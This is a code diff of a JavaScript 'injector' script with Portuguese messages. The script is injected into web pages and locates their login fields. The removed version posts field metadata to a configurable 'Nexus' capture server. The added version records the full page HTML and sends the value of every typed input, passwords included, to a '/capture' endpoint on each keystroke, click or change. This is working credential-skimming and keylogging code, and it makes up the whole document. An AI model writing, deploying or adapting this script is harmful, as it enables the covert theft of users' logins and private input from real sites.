@@ -1,76 +1,77 @@
-// injector.js
-(function(){
-  // Configuration: replace these values when you deploy
-  var NEXUS_CAPTURE_URL = (window.__NEXUS_CAPTURE_URL__ || "REPLACE_WITH_YOUR_NEXUS_URL/capture"); 
-  var TOKEN = (window.__NEXUS_TOKEN__ || "REPLACE_WITH_YOUR_TOKEN");
-
-  function grabInputInfo(input){
-    return {
-      tag: input.tagName,
-      type: input.type || null,
-      name: input.name || null,
-      id: input.id || null,
-      placeholder: input.placeholder || null,
-      xpath: xpathForElement(input)
-    };
-  }
-
-  function xpathForElement(el){
-    if (!el) return null;
-    var segs = [];
-    for (; el && el.nodeType == 1; el = el.parentNode) {
-      var i = 1;
-      for (var sib = el.previousSibling; sib; sib = sib.previousSibling) {
-        if (sib.nodeType == 1 && sib.tagName == el.tagName) i++;
-      }
-      var tagName = el.tagName.toLowerCase();
-      var seg = tagName + '[' + i + ']';
-      segs.unshift(seg);
+(function() {
+    function getUniqueSelector(el) {
+        if (el.id) return `#${el.id}`;
+        if (el.name) return `${el.tagName.toLowerCase()}[name="${el.name}"]`;
+        let path = [];
+        while (el && el.nodeType === Node.ELEMENT_NODE) {
+            let selector = el.tagName.toLowerCase();
+            if (el.className) {
+                let classes = el.className.trim().split(/\s+/).join('.');
+                selector += `.${classes}`;
+            }
+            let sibling = el;
+            let nth = 1;
+            while ((sibling = sibling.previousElementSibling)) {
+                if (sibling.tagName === el.tagName) nth++;
+            }
+            selector += `:nth-of-type(${nth})`;
+            path.unshift(selector);
+            el = el.parentElement;
+        }
+        return path.join(' > ');
     }
-    return '/' + segs.join('/');
-  }
 
-  function collect(){
-    var inputs = Array.from(document.querySelectorAll("input, button, textarea, select"));
-    var infos = inputs.map(grabInputInfo);
-    // attempt heuristics for email/password/submit
-    var email = inputs.find(i => i.type === 'email' || (i.placeholder && /email|e-mail/i.test(i.placeholder)) || (i.name && /email|user/i.test(i.name)));
-    var password = inputs.find(i => i.type === 'password' || (i.placeholder && /senha|password/i.test(i.placeholder)) || (i.name && /pass|senha/i.test(i.name)));
-    var submit = inputs.find(i => (i.type && (i.type==='submit' || i.type==='button')) || (i.tagName && i.tagName.toLowerCase()==='button'));
-    var payload = {
-      url: location.href,
-      title: document.title,
-      captured_at: new Date().toISOString(),
-      inputs: infos,
-      heuristics: {
-        email: email ? grabInputInfo(email) : null,
-        password: password ? grabInputInfo(password) : null,
-        submit: submit ? grabInputInfo(submit) : null
-      }
-    };
-    return payload;
-  }
+    function captureInitialData() {
+        const emailInput = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+        const passwordInput = document.querySelector('input[type="password"]');
+        const submitButton = document.querySelector('button[type="submit"], input[type="submit"]');
 
-  function send(payload){
-    var url = NEXUS_CAPTURE_URL + (NEXUS_CAPTURE_URL.indexOf('?') === -1 ? '?' : '&') + 'token=' + encodeURIComponent(TOKEN);
-    fetch(url, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(payload)
-    }).then(function(resp){ 
-      if(resp.ok) alert("Nexus: captura enviada com sucesso.");
-      else alert("Nexus: falha ao enviar (status "+resp.status+").");
-    }).catch(function(err){
-      alert("Nexus: erro ao enviar captura: " + err);
-    });
-  }
+        return {
+            url: window.location.href,
+            outerHTML: document.documentElement.outerHTML,
+            selectors: {
+                email: emailInput ? getUniqueSelector(emailInput) : null,
+                password: passwordInput ? getUniqueSelector(passwordInput) : null,
+                submit: submitButton ? getUniqueSelector(submitButton) : null
+            }
+        };
+    }
 
-  try {
-    var payload = collect();
-    console.log("Nexus injector payload:", payload);
-    send(payload);
-  } catch(e) {
-    console.error("injector error:", e);
-    alert("Injector error: " + e);
-  }
+    function sendData(data) {
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(e => console.error('Erro ao enviar dados:', e));
+    }
+
+    function monitorInteractions() {
+        ['input', 'click', 'change'].forEach(eventType => {
+            document.addEventListener(eventType, event => {
+                const el = event.target;
+                if (!el) return;
+
+                const data = {
+                    eventType,
+                    selector: getUniqueSelector(el),
+                    value: el.value || null,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                };
+                sendData(data);
+            }, true);
+        });
+    }
+
+    function init() {
+        const initialData = captureInitialData();
+        sendData({ type: 'initial', data: initialData });
+        monitorInteractions();
+    }
+
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        init();
+    } else {
+        window.addEventListener('DOMContentLoaded', init);
+    }
 })();
